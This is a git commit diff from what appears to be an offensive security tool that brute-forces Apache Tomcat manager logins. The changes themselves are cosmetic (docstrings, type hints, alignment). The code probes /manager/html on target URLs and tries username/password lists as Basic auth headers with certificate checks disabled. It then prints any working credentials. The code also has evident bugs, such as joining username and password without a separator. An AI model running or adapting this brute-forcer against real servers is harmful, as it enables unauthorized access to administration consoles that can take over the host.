a32911d6bd3bf695649955d2840df61dafa520c9
oppsec <daniel.sdm.github@gmail.com>
2021-07-10 18:50:48 -0300

    improve: improved code legibility

--- src/core/main.py
+++ src/core/main.py
@@ -10,15 +10,16 @@ from src.core.manager import *
 
 
 def connect() -> str:
-    "Try to connect to the target"
+    """Try to connect to the target
+    """
 
     for url in get_urls():
-        path = f"{url}/manager/html"
+        path: str = f"{url}/manager/html"
 
         try:
-            response = get(path, **props)
-            body = response.text
-            status_code = response.status_code
+            response        = get(path, **props)
+            body: str       = response.text
+            status_code:str = response.status_code
 
             detect = lambda success = 401 or 200: status_code == success and 'Tomcat' or 'tomcat' in body
             (bruteforce(path)) if detect() else print(f"[red][ERR] Connection problems with {url} | {status_code}")
@@ -28,25 +29,26 @@ def connect() -> str:
 
 
 def bruteforce(path) -> str:
-    "Bruteforce the Tomcat login"
+    """Bruteforce the Apache Tomcat manager login generating a cookie
+    """
 
-    print(f"[cyan][INF] Tomcat detected in: {path} | Starting bruteforce...")
+    print(f"[cyan][INF] Tomcat detected in {path} starting bruteforce...")
 
     for u, p in zip(get_usernames(), get_passwords()):
 
-        auth_string = u+p
-        auth_string = auth_string.encode('utf-8')
-        auth_string = b64encode(auth_string)
-        auth_string = f'Basic {auth_string}'
+        auth_string: str  = u+p
+        auth_string: str  = auth_string.encode('utf-8')
+        auth_string: str  = b64encode(auth_string)
+        auth_string: str  = f'Basic {auth_string}'
 
-        chars = "b'"
-        auth_string = auth_string.replace(chars, "")
-        auth_string = auth_string.replace("'", "")
+        chars: str  = "b'"
+        auth_string: str  = auth_string.replace(chars, "")
+        auth_string: str  = auth_string.replace("'", "")
 
-        auth_header = { 'Authorization': auth_string, 'User-Agent': user_agent() }
+        auth_header: str  = { 'Authorization': auth_string, 'User-Agent': user_agent() }
 
-        response = get(path, verify=False, headers=auth_header)
-        status_code = response.status_code
+        response          = get(path, verify=False, headers=auth_header)
+        status_code: str  = response.status_code
 
         if(status_code == 200):
             print(f"[green][INF] Login: {u+p} | URL: {path} | Cookie: {auth_string} \n")
@@ -56,3 +58,5 @@ def bruteforce(path) -> str:
 
         else:
             pass
+
+    print(f"[cyan][INF] Bruteforce on {path} is done.\n")
